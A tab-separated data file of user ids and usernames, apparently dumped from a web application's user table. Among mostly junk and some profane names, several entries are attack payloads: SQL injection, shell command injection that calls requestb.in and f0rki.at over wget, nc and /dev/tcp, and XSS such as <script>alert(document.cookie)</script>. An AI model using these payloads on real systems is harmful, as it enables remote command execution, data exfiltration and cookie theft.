id	username
293	"svservsrverves
294	noob
295	ersou
296	tt
297	1
298	lola
299	asdfa
300	irgeeks5
301	sajjad
302	aaaaaaa
303	hogehogh
304	vic511
305	vic
306	cost6
307	sajjads
308	ripsec4
309	cost6_2
310	ddd
311	aaatest
312	''
313	s
314	loluser23
315	dot.
316	admin1342
317	admin13472
318	admin134712
319	admin134712'
320	abcabc
321	b0yd
322	qweqwe
323	q
324	b0yd2
325	admin2
326	loluser24
327	pepe
328	jorgue
329	bobbyhill
330	ripsec5
331	hankhill
332	pepe123
333	peggyhill
334	pepe1234
335	useuse
336	billdotree
337	theirneighbor
338	aaa
339	culo
340	c43s4r
341	x' or 'x'='x
342	112233
343	peacemaker
344	hops
345	harambae
346	john
347	bluqueef
348	frankbean
349	bobby
350	dade
351	temp
352	tester
353	glucose2
354	asdf
355	fapfap`
356	fapfap2
357	fapfap3
358	blahy
359	qwe
360	smith
361	hgregal
362	\\
363	iangcarroll
364	testtesttest
365	igc1
366	foo
367	test1120
368	test1121
369	testuser
370	adm1nkyj
371	eatadik
372	eatadik2
373	qqqq
374	xx1
375	neegan
376	aajak
377	mmzuku
378	dupa
379	dragonsector
380	nilch
381	aldo_k
382	blendin
383	fghhttvx
384	qngugrtl
385	test2
386	fpltnttk
387	1234
388	lmowfvnq
389	<hr>
390	test1
391	'; wget http://requestb.in/s9rxxfs9 #
392	'; wget 'http://requestb.in/s9rxxfs9?x=a' #
393	'; wget http://requestb.in/1fpgw081 #
394	ddf
395	abc&
396	132123123123123
397	sebyza
398	krwawobrody
399	vik0nd
400	asdas<img src="http://requestb.in/1n7t95g1">
401	<img src="http://requestb.in/1n7t95g1">
402	qweppp
403	asdlll
404	meowmeow
405	trest
406	testid1
407	wtf
408	usertest
409	fucker
410	wizards1
411	wizard2
412	<script>alert('fuck')</script>
413	<script>alert('fuck2')</script>
414	k
415	john2342
416	injectyy
417	;asuh;saoehf;io
418	wat
419	test >dev/null; echo "wat" > /dev/tcp/f0rki.at/4444; echo "wat"
420	test >dev/null; echo "wat" | nc f0rki.at 4444; echo "wat"
421	yologalore
422	pwngalore
423	watwatwat
424	133713pwnies
425	pwnies
426	mhackgyver
427	<script>alert('aa');</script>
428	juliÃ nassange
429	a<i>
430	gh5ewrsg3w4v
431	12345
432	raku
433	black1
434	bigmacjoe
435	aaaaa
436	t94j0
437	test'
438	julianasange
439	ttt
440	ccc
441	vtest3
442	webzy
443	n
444	naps
445	hotab
446	hotab2
447	sayfrbme
448	ruytbail
449	xxrootxx
450	corb3nik_test
451	vtest4
452	gay
453	<script>(alert cookie.txt)</script>
454	sdfsdf
455	<script>alert(document.cookie)</script>
456	sean
457	avramescu
458	vik0nd123
459	thedonald
460	pwnies4life
461	itswill
462	asdplm
463	vtest6
464	asdpml2
465	asdtenplm
466	bogdan
467	chuj
468	zzz
469	wsrskrgs
470	root
471	killer
472	txoyolie
473	adami
474	admin                                                 x
475	admin                                                          x
476	yoyo
477	testfo
478	bobthehacker
479	hh1234567890
480	dev/null 
481	aaaaa1
482	blabla<img src=a>
483	p1
484	joe
485	xnxx
486	headerenrichment
487	headerenrichment2
488	cambridge2
489	ddog
490	opentoall
